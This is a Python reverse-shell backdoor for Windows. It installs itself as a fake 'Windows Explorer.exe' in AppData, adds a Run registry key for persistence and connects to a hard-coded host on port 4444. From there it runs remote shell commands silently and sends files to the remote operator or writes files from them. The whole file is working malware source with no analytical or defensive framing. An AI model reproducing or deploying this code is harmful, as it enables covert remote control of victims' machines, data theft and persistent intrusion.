import socket
import subprocess
import json
import os
import base64
import sys
import shutil

ip = "192.168.43.103"
port = 4444

def become_persistent():
    file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
    # __file__ refer to the current python file.
    # sys.executable current executable file.
    if not os.path.exists(file_location):
        shutil.copyfile(sys.executable, file_location)
        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Test /t REG_SZ /d "'+ file_location +'"', shell=True)

try: 
    become_persistent()
    connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    connection.connect((ip, port))
except Exception:
    sys.exit()


def reliable_send(data):
    data = base64.b64encode(data)
    json_data = json.dumps(data)
    connection.send(json_data)


def reliable_receive():
    json_data = ""
    while True:
        try:
            json_data = json_data + connection.recv(1024)
            return json.loads(json_data)
        except ValueError:
            continue


def execute_system_commmand(command):
    #added for noconsole when executable packaging
    DEVNULL = open(os.devnull, "wb")
    return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)


def change_working_directory_to(path):
    os.chdir(path)
    return "[+] Change working directory to " + path

def write_file(path,content):
    with open(path,"wb") as file:
        file.write(base64.b64decode(content))
        return "[+] Upload Succesful"

def read_file(path):
    with open(path,"rb") as file:
        return base64.b64encode(file.read())

while True:
    command = reliable_receive()
    try:
        if command[0] == "exit":
            connection.close()
            sys.exit()
        elif command[0] == "cd" and len(command) > 1:
            command_result = change_working_directory_to(command[1])
        elif command[0] == "download":
            command_result = read_file(command[1])
        elif command[0] == "upload":
            command_result = write_file(command[1],command[2])
        else:
            command_result = execute_system_commmand(command)
    except Exception:
        command_result = "[-] Error during command Execution"

    reliable_send(command_result)
